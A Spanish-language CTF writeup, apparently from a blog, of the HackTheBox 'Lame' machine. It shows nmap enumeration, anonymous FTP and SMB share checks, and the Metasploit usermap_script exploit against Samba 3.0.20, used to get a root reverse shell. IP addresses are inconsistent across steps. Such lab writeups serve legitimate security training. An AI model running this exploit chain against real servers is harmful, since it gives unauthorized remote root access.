---
layout: post
title: "Lame"
date: 2025-12-01 16:41:21 +0200
categories: [writeups]
tags: [HTB, Lame, Linux]
description: "Writeup de la máquina Lame de Hackthebox"
image: /assets/images/hackthebox.png
---
## Resumen de la resolución

**Lame** es una máquina **Linux** de dificultad **Easy** de la plataforma de **HackTheBox**,lame fue una máquina histórica en Hack The Box, requiriendo un único exploit para obtener acceso de root debido a servicios desactualizados.

---
## Enumeración

En primer lugar, debemos desplegar la máquina para poder obtener la **Dirección IP** todo ello desde la web de **HackTheBox** y luego desde la **terminal** debemos conectarnos a la VPN usando el fichero correspondiente de la siguiente forma:

```bash
openvpn lab_Frasan15.opvn
```

Luego le lanzamos un **ping** para comprobar si la maquina esta activa. Verificamos que responde correctamente devolviendo el paquete enviado. A continuacion, utilizamos un script propio que, a partir del valor del  **ttl**  permite identificar el tipo de sistema operativo: **Linux (TTL 64 )** o **Windows (TTL 128)**, en este caso, observamos un **TTL** próximo a 64 (**64**) por lo que se trata de una máquina **Linux**

> El motivo por el cual el **TTL** es de **64** es porque el paquete pasa por unos intermediarios (routers) antes de llegar a su destino (máquina atacante). Esto podemos comprobarlo con el comando `ping -c 1 -R 10.10.10.100`.
### Nmap

En segundo lugar, realizaremos un escaneo por **TCP** usando **Nmap** para ver que puertos de la máquina víctima se encuentra abiertos.

```bash
nmap 10.129.16.24 -p- --open -T5 -v -n -oG allPorts
```

Observamos como nos reporta que se encuentran abiertos un montón de puertos.

Ahora, gracias a la utilidad **extractPorts** definida en nuestra **.zshrc** podremos copiarnos cómodamente todos los puerto abiertos de la máquina víctima a nuestra **clipboard**.

A continuación, volveremos a realizar un escaneo con **Nmap**, pero esta vez se trata de un escaneo más exhaustivo pues lanzaremos unos script básicos de reconocimiento, además de que nos intente reportar la versión y servicio que corre para cada puerto.

```bash
nmap -sC -sV -p21,22,139,445,3632 10.129.16.24 -oN targeted
```

En el segundo escaneo de **Nmap**, lo primero que llama la atención es el FTP anónimo por el puerto 21.

![](/assets/images/nmap.png)

___
### Puerto 21 - FTP (Anonimo)

Como **FTP** permite inicios de sesion, nos conectamos al servidor (usuario: anonymous, password: anonymous), para ello utilizamos el siguiente comando:

```bash
ftp 10.129.16.24
```
Si ejecutamos el comando ls vemos que el servidor esta vacio.

Salimos del FTP con un “quit”.

### Puerto 445 - SMB (Samba)

Para verificar si el **SMB** es vulnerable ejecutamos el script smb-enum-shares de nmap en el cual podemos ver los siguientes resultados:

$ nmap --script smb-enum-shares -p445 -Pn 10.10.10.3 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower. Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 10:08 CET Nmap scan report for 10.10.10.3 Host is up (0.047s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb-enum-shares: | account_used: <blank> | \\10.10.10.3\ADMIN$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: <none> | \\10.10.10.3\IPC$: | Type: STYPE_IPC | Comment: IPC Service (lame server (Samba 3.0.20-Debian)) | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: READ/WRITE | \\10.10.10.3\opt: Type: STYPE_DISKTREE | Comment: | Users: 1 | Max Users: <unlimited> | Path: C:\tmp | Anonymous access: <none> | \\10.10.10.3\print$: | Type: STYPE_DISKTREE | Comment: Printer Drivers | Users: 1 | Max Users: <unlimited> | Path: C:\var\lib\samba\printers | Anonymous access: <none> | \\10.10.10.3\tmp: | Type: STYPE_DISKTREE | Comment: oh noes! | Users: 1 | Max Users: <unlimited> | Path: C:\tmp |_ Anonymous access: READ/WRITE Nmap done: 1 IP address (1 host up) scanned in 45.30 seconds

Esto nos indica que la ruta \10.129.16.24\tmp es vulnerable con acceso anónimo de lectura y escritura.



###ExploitMetasploit

Para lanzar un exploit primero debemos abrir la consola con el sigiuente comando:

```bash    
msfconsole
```

Una vez tengamos la consola abierta buscamos los exploits para dicha version


```bash    
$ msfconsole msf6 > search samba 3.0.20            
```
Elegimos el exploit: **exploit/multi/samba/usermap_script**

Y ejecutamos de la siguiente forma:


```bash
msf6 > use exploit/multi/samba/usermap_script msg exploit(exploit/multi/samba/usermap_script) > set rhost 10.10.10.3 msg exploit(exploit/multi/samba/usermap_script) > set lhost 10.10.14.7 msg exploit(exploit/multi/samba/usermap_script) > run    
```
Y automáticamente tendremos una shell inversa como root.

Al enviar un **cat/home/maskis/users.txt** en la terminal lograremos ver la flag de usuario.
Y para identificar la flag de root **cat /root/root.txt**



La máquina Lame de Hack The Box es un objetivo de nivel inicial que permite practicar la identificación y explotación de vulnerabilidades conocidas en servicios clásicos. Durante el análisis se detectaron servicios como vsftpd con acceso FTP anónimo, la presencia de Samba vulnerable (smbd 3.0.20) y un servicio distcc expuesto. La explotación principal se basa en una vulnerabilidad crítica de Samba que permite obtener ejecución remota de comandos sin autenticación. A partir de esto, es posible obtener una shell en el sistema y escalar hasta el usuario root.

En resumen, Lame es una máquina ideal para principiantes, ya que demuestra la importancia de identificar versiones desactualizadas, validar servicios expuestos y aprovechar exploits públicos de forma controlada.











